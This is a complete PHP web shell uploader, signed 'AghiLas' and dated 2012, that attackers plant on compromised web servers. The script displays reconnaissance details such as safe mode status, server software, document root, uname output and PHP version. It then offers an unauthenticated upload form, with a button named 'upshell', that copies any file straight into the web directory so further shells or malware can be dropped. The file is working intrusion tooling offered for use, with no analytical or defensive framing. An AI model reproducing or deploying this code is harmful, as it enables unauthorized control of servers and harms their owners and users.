<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
    "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">

<html xmlns="http://www.w3.org/1999/xhtml">

<head>
  <title>UpLoAd£r</title>
</head>

<body>


<?php
//By AghiLas
//E-mail:pasta7lab
//For All My Amis
// Ana La Osameh Hta Wahed Ykteb Scripet B Ismo 
$PhpVersion = phpversion();
$Uname = php_uname();
$ip=$_SERVER['REMOTE_ADDR'];
$Rot = $_SERVER['GATEWAY_INTERFACE'];
$Ro0ot = $_SERVER['SERVER_NAME'];
$Ro00ot = $_SERVER['SERVER_SOFTWARE'];
$Ro000ot = $_SERVER['SERVER_PROTOCOL'];
$Ro0000ot = $_SERVER['REQUEST_METHOD'];
$Ro00000ot = $_SERVER['REQUEST_TIME'];
$R000oot = $_SERVER['HTTP_ACCEPT'];
$R0o0000ot = $_SERVER['HTTP_ACCEPT_CHARSET'];
$Ro0o0t = $_SERVER['DOCUMENT_ROOT'];

echo '<b><i><u><center><h2>UploadeR By Agh!LAs</h2></center></u></i></b>';
$safe_mode = ini_get("safe_mode");//safemade
if (!$safe_mode){$safe_mode = '<font color="green"><b><i><u>OFF (Not Secure)</u></i></b></font>';}
 else {$safe_mode = '<font color="red"><b><i><u>ON</u></i></b></font>';}
echo'<center><b><i>SaFeMode Is</i></b> '.$safe_mode.'</b><br></center>';
echo'<center><i><b>GATEWAY INTERFACE :</b></i><b> <font color="red">'.$Rot.'</font></b><br></center>';
echo'<center><i><b>SERVER SOFTWARE :</b></i><b> <font color="red">'.$Ro00ot.'</font></b><br></center>';
echo'<center><i><b>SERVER_PROTOCOL :</b></i><b> <font color="red">'.$Ro000ot.'</font></b><br></center>';
echo'<center><i><b>REQUEST_METHOD :</b></i><b> <font color="red">'.$Ro0000ot.'</font></b><br></center>';
echo'<center><i><b>REQUEST_TIME :</b></i><b> <font color="red">'.$Ro00000ot.'</font></b><br></center>';
echo'<center><i><b>HTTP_ACCEPT :</b></i><b> <font color="red">'.$R0o0000ot.'</font></b><br></center>';
echo'<center><i><b>DOCUMENT_ROOT :</b></i><b> <font color="red">'.$Ro0o0t.'</font></b><br></center>';
echo'<center><i><b>Site Web :</b></i><b> <font color="red">'.$_SERVER['SERVER_NAME'].'</font></b><br></center>';
echo'<center><b><i>Uname : </i></b><b><font color="red">'.$Uname.'</font></b><br></center>';
echo'<center><b><i>PhpVersion : </i></b><b><font color="red">'.'Php/'.$PhpVersion.'</font></b><br></center>';
echo'<center><b><i>Your Server : </i></b><b><font color="green">'.$ip.'</font></b><br></center>';
echo'<center><font color:"red"><span style="font-family: monospace;"><span style="color: rgb(255, 255, 255);">o</span>';
echo'<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo'<input type="file" name="file" size="50"><input name="upshell" type="submit" id="upshell" value="Upload"></form>';
if( $_POST['upshell'] == "Upload" ) { if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>File was UploadeD</b><br><br>'; }else{ echo '<b>n</b><br><br></font>'; } }
echo ' MaDe !N Dz (c) ';
echo'<center><i><b>2012 [ Production ]</b></i><b>';
?>


</body>
</html>
